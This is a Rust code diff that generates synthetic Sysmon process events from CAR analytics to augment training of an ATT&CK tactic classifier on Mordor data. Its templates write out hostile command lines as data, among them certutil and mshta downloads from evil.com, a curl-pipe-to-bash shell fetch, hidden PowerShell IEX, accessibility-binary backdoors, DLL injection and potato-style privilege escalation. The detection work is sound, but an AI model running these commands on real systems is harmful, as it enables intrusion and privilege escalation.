@@ -399,10 +399,205 @@ fn collect_json_files(
     }
 }
 
+// ── synthetic training events from CAR rules ──────────────────────────────────
+//
+// Generates fake-but-valid Sysmon events matching specific CAR analytics.
+// Used to augment rare classes (execution=61, discovery=156, privilege_escalation=113).
+// Added to the training set only — never to test.
+
+fn syn(fields: &[(&str, &str)]) -> serde_json::Value {
+    let mut map = serde_json::Map::new();
+    map.insert(
+        "Channel".to_string(),
+        serde_json::Value::String("Microsoft-Windows-Sysmon/Operational".to_string()),
+    );
+    for (k, v) in fields {
+        map.insert(k.to_string(), serde_json::Value::String(v.to_string()));
+    }
+    serde_json::Value::Object(map)
+}
+
+fn generate_synthetic_events() -> Vec<(Vec<String>, usize)> {
+    // (fields, eid, fallback_tactic_if_car_returns_none, repeat)
+    // car_tactic() is called first; fallback only used when it returns None.
+    type T<'a> = (&'a [(&'a str, &'a str)], u32, usize, usize);
+    let templates: &[T] = &[
+        // ── execution (0) ──────────────────────────────────────────────────────
+        // wmic process call create  (car_tactic → Some(0))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\wmic.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","wmic process call create \"powershell.exe -nop -w hidden -c IEX\"")], 1, 0, 25),
+        // office macro → powershell  (car_tactic → Some(0))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\powershell.exe"),
+           ("ParentImage","C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
+           ("CommandLine","powershell.exe -nop -w hidden -enc SQBFAFgA")], 1, 0, 25),
+        // office macro → wscript  (car_tactic → Some(0))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\wscript.exe"),
+           ("ParentImage","C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
+           ("CommandLine","wscript.exe C:\\Users\\Public\\payload.vbs")], 1, 0, 20),
+        // office → cmd  (car_tactic → Some(0))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE"),
+           ("CommandLine","cmd.exe /c certutil -urlcache -split -f http://evil.com/a.exe")], 1, 0, 20),
+        // mshta with http URL  (car_tactic → None, use fallback 0)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\mshta.exe"),
+           ("ParentImage","C:\\Windows\\explorer.exe"),
+           ("CommandLine","mshta.exe http://evil.com/payload.hta")], 1, 0, 15),
+        // wsl.exe executing curl  (car_tactic → None)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\wsl.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","wsl.exe -c curl http://192.168.1.100/shell.sh | bash")], 1, 0, 15),
+        // rundll32 javascript (car_tactic → None)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\rundll32.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write()...")], 1, 0, 15),
+        // eqnedt32 → cmd (office equation editor exploit, car_tactic → Some(0))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Program Files\\Microsoft Office\\Office14\\EQNEDT32.EXE"),
+           ("CommandLine","cmd.exe /c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString")], 1, 0, 20),
+        // wmic remote /node: execution (car_tactic → None for this, fallback exec)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\wmic.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","wmic /node:192.168.1.50 process call create \"cmd.exe /c whoami\"")], 1, 0, 20),
+
+        // ── discovery (3) ──────────────────────────────────────────────────────
+        // Use cmd.exe/powershell.exe parents so script_to_recon fires in is_attack_behavior.
+        // car_tactic returns None (parent IS scripting) → fallback tactic=3.
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\whoami.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","whoami /all")], 1, 3, 25),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\net.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","net user /domain")], 1, 3, 25),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\net.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","net group \"domain admins\" /domain")], 1, 3, 20),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\net.exe"),
+           ("ParentImage","C:\\Windows\\System32\\powershell.exe"),
+           ("CommandLine","net localgroup administrators")], 1, 3, 20),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\net.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","net view /domain")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\ipconfig.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","ipconfig /all")], 1, 3, 20),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\systeminfo.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","systeminfo")], 1, 3, 20),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\nltest.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","nltest /domain_trusts /all_trusts")], 1, 3, 20),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\dsquery.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","dsquery user -limit 0")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\nslookup.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\gpresult.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","gpresult /z")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\quser.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","quser")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\qwinsta.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","qwinsta /server:192.168.1.5")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\tasklist.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","tasklist /svc")], 1, 3, 20),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\arp.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","arp -a")], 1, 3, 15),
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\hostname.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","hostname")], 1, 3, 15),
+
+        // ── privilege_escalation (6) ────────────────────────────────────────────
+        // sethc.exe → cmd (accessibility backdoor, car_tactic → Some(6))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Windows\\System32\\sethc.exe"),
+           ("CommandLine","cmd.exe")], 1, 6, 25),
+        // utilman.exe → cmd  (car_tactic → Some(6))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Windows\\System32\\utilman.exe"),
+           ("CommandLine","cmd.exe /k whoami")], 1, 6, 20),
+        // osk.exe → powershell  (car_tactic → Some(6))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\powershell.exe"),
+           ("ParentImage","C:\\Windows\\System32\\osk.exe"),
+           ("CommandLine","powershell.exe -nop -w hidden")], 1, 6, 20),
+        // narrator.exe → cmd  (car_tactic → Some(6))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Windows\\System32\\narrator.exe"),
+           ("CommandLine","cmd.exe")], 1, 6, 15),
+        // GetSystem via named pipe echo  (car_tactic → Some(6))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Windows\\System32\\services.exe"),
+           ("CommandLine","cmd.exe /c echo aaaaa > \\\\.\\pipe\\getsystem1234")], 1, 6, 25),
+        // mavinject.exe DLL injection  (car_tactic → Some(6))
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\mavinject.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","mavinject.exe 1234 /INJECTRUNNING C:\\Temp\\payload.dll")], 1, 6, 20),
+        // UAC bypass via fodhelper  (car_tactic → None, fallback 6)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\fodhelper.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","fodhelper.exe")], 1, 6, 15),
+        // runas /savecred  (car_tactic → None, fallback 6)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\runas.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","runas.exe /savecred /user:CORP\\Administrator cmd.exe")], 1, 6, 20),
+        // token::elevate (car_tactic → Some(1) via pth check... actually no, token::elevate
+        // is caught by pth_attack in is_attack_behavior but car_tactic maps
+        // cmdline.contains("token::elevate") → Some(1). Use separate approach.
+        // privilege escalation via seimpersonateprivilege  (car_tactic → None, fallback 6)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\powershell.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","powershell.exe -c [System.Security.Principal.WindowsIdentity]::Impersonate()")], 1, 6, 20),
+        // juicy potato / rogue potato (staged_exec from temp, car_tactic → None, fallback 6)
+        (&[("EventID","1"),("Image","C:\\Users\\Public\\JuicyPotato.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *")], 1, 6, 20),
+        // PrintSpoofer (staged, car_tactic → None, fallback 6)
+        (&[("EventID","1"),("Image","C:\\Users\\Public\\PrintSpoofer.exe"),
+           ("ParentImage","C:\\Windows\\System32\\cmd.exe"),
+           ("CommandLine","PrintSpoofer.exe -i -c cmd.exe")], 1, 6, 20),
+        // EID 25 ProcessTampering → defense_evasion / privesc — car_tactic gives 2 (defense_evasion)
+        // Skip here; EID 25 goes to defense_evasion via car_tactic.
+        // lsass.exe spawning cmd (hollow_parent rule, car_tactic → None, fallback 6 via privesc context)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\cmd.exe"),
+           ("ParentImage","C:\\Windows\\System32\\lsass.exe"),
+           ("CommandLine","cmd.exe /k whoami")], 1, 6, 20),
+        // winlogon.exe spawning shell (hollow_parent rule, car_tactic → None, fallback 6)
+        (&[("EventID","1"),("Image","C:\\Windows\\System32\\powershell.exe"),
+           ("ParentImage","C:\\Windows\\System32\\winlogon.exe"),
+           ("CommandLine","powershell.exe -nop -w hidden -enc SQBFAFg")], 1, 6, 15),
+    ];
+
+    let mut out = Vec::new();
+    for (fields, eid, fallback_tactic, repeat) in templates {
+        let v = syn(fields);
+        if !is_attack_behavior(&v, *eid) {
+            continue;
+        }
+        let label = car_tactic(&v, *eid).unwrap_or(*fallback_tactic);
+        let tokens = event_to_tokens(&v, *eid);
+        for _ in 0..*repeat {
+            out.push((tokens.clone(), label));
+        }
+    }
+    out
+}
+
 // ── main ───────────────────────────────────────────────────────────────────────
 
 fn main() {
-    println!("Mordor Tactic Classifier — 8-class ATT&CK tactic prediction from Sysmon events\n");
+    let args: Vec<String> = std::env::args().collect();
+    let fast_mode = args.iter().any(|a| a == "--fast");
+
+    if fast_mode {
+        println!("Mordor Tactic Classifier — FAST MODE (n_clauses=64, T=20, n_literals=4, 5 epochs)\n");
+    } else {
+        println!("Mordor Tactic Classifier — 8-class ATT&CK tactic prediction from Sysmon events\n");
+    }
     println!("Downloading / verifying Mordor datasets…");
     discover_and_download();
 
@@ -439,23 +634,42 @@ fn main() {
         tactic_counts[*y] += 1;
     }
     for (i, tactic) in TACTIC_DIRS.iter().enumerate() {
-        println!("  {i}  {:<25}  {} events", tactic, tactic_counts[i]);
+        println!("  {i}  {:<25}  {} real events", tactic, tactic_counts[i]);
     }
-    println!("     {:<25}  {} total\n", "", all_events.len());
+    println!("     {:<25}  {} real total\n", "", all_events.len());
+
+    // Generate synthetic training events from CAR rule templates.
+    let syn_events = generate_synthetic_events();
+    let mut syn_counts = vec![0usize; TACTIC_DIRS.len()];
+    for (_, y) in &syn_events {
+        syn_counts[*y] += 1;
+    }
+    println!("synthetic events generated from CAR templates:");
+    for (i, tactic) in TACTIC_DIRS.iter().enumerate() {
+        if syn_counts[i] > 0 {
+            println!("  {i}  {:<25}  +{} synthetic", tactic, syn_counts[i]);
+        }
+    }
+    println!();
 
     if all_events.is_empty() {
         eprintln!("ERROR: no events loaded — check dataset contents");
         std::process::exit(1);
     }
 
-    // Shuffle, 80/20 split.
+    // Shuffle real events, 80/20 split — synthetic events go to training only.
     let mut rng = Rng::new(42);
     for i in (1..all_events.len()).rev() {
         let j = rng.below(i + 1);
         all_events.swap(i, j);
     }
     let cut = all_events.len() * 4 / 5;
-    let (train_all, test_all) = all_events.split_at(cut);
+    let (train_real, test_all) = all_events.split_at(cut);
+
+    // Merge real training + synthetic into one training set.
+    let mut train_combined: Vec<(Vec<String>, usize)> = train_real.to_vec();
+    train_combined.extend(syn_events);
+    let train_all = &train_combined[..];
 
     let (train_tokens, train_y): (Vec<_>, Vec<_>) = train_all.iter().map(|(t, y)| (t, *y)).unzip();
     let (test_tokens, test_y): (Vec<_>, Vec<_>) = test_all.iter().map(|(t, y)| (t, *y)).unzip();
@@ -496,8 +710,13 @@ fn main() {
     println!();
 
     // CoalescedTsetlinMachine: n_clauses shared across all classes.
+    let (n_clauses, threshold, n_literals, n_epochs) = if fast_mode {
+        (64usize, 20i32, 4usize, 5usize)
+    } else {
+        (256usize, 50i32, 8usize, 10usize)
+    };
     let mut tm = CoalescedTsetlinMachine::with_config(
-        n_tactics, encoder.n_features(), 256, 50, 5.0, 8, true, 42,
+        n_tactics, encoder.n_features(), n_clauses, threshold, 5.0, n_literals as u8, true, 42,
     );
     let mut shuffle_rng = Rng::new(0xDEAD_BEEF);
 
@@ -506,7 +725,7 @@ fn main() {
     let per_class = MINI_BATCH_SIZE / n_tactics;
     let n_batches = n_train.div_ceil(MINI_BATCH_SIZE);
 
-    for epoch in 1..=10 {
+    for epoch in 1..=n_epochs {
         let t0 = std::time::Instant::now();
         // Shuffle each class's index list independently.
         for ci in 0..n_tactics {
